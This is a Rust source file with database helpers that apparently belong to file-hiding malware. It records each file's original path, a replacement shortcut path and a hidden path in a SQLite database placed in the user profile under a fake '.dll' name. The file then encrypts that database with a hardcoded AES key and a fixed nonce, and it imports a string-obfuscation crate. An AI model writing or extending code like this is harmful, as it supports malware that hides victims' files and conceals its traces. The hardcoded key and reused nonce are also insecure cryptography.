use std::fs;
use std::env;
use std::io::Read;
use std::io::Write;
use rand::seq::IndexedRandom;
use sha256::digest;
use std::path::Path;
use std::fs::File;
use std::io::{BufRead, BufReader};
use serde_json::{Result, Value};
// use lnk::ShellLink;
use mslnk::ShellLink;
use rusqlite::{Connection, params};
use std::path::PathBuf;

use aes_gcm::{
    aead::{Aead, AeadCore, KeyInit, OsRng},
    Aes256Gcm, Nonce, Key // Or `Aes128Gcm`
};

use obfstr::obfstr;


















pub(crate) fn init_db(){
    let db_path = format!("{}\\{}", std::env::var("USERPROFILE").ok().unwrap(), "raw_mapping_db.dll");
    // fs::create_dir_all(r"C:\ProgramX")?; 
    let conn = Connection::open(db_path).unwrap();

    conn.execute(
        "CREATE TABLE IF NOT EXISTS mapping (
            hash TEXT PRIMARY KEY,
            original_path TEXT NOT NULL,
            lnk_path TEXT NOT NULL,
            hidden_path TEXT NOT NULL,
            sre TEXT NOT NULL
        )",
        [],
    ).unwrap();

    conn.close();
}



pub(crate) fn encrypt_db() {
    let db_path = format!("{}\\{}", std::env::var("USERPROFILE").ok().unwrap(), "raw_mapping_db.dll");
    let path = Path::new(&db_path);
    let plainbuf: Vec<u8> = fs::read(path).unwrap();


    
    let key = Key::<Aes256Gcm>::from_slice(b"VeryInsecure_And_HardcodedAESKey");
    let cipher = Aes256Gcm::new(&key);
    let nonce = Nonce::from_slice(b"shouldtwelve");
    let ciphertext = cipher.encrypt(&nonce, plainbuf.as_ref()   ).unwrap();


    let encdb_path = format!("{}\\{}", std::env::var("USERPROFILE").ok().unwrap(), "enc_mapping_db.dll");
    let path = Path::new(&encdb_path);
    let mut file = File::create(path).unwrap();
    file.write_all(&ciphertext).unwrap();



    fs::remove_file(Path::new(&db_path) ).unwrap();

}





pub(crate) fn decrypt_db() {
    let encdb_path = format!("{}\\{}", std::env::var("USERPROFILE").ok().unwrap(), "enc_mapping_db.dll");
    let path = Path::new(&encdb_path);
    let encbuf: Vec<u8> = fs::read(path).unwrap();



    let key = Key::<Aes256Gcm>::from_slice(b"VeryInsecure_And_HardcodedAESKey");
    let cipher = Aes256Gcm::new(&key);
    let nonce = Nonce::from_slice(b"shouldtwelve");
    let plaintext = cipher.decrypt(&nonce, encbuf.as_ref()   ).unwrap();


    let db_path = format!("{}\\{}", std::env::var("USERPROFILE").ok().unwrap(), "raw_mapping_db.dll");
    let mut file = File::create(&db_path).unwrap();
    file.write_all(&plaintext).unwrap();


}


fn main(){

}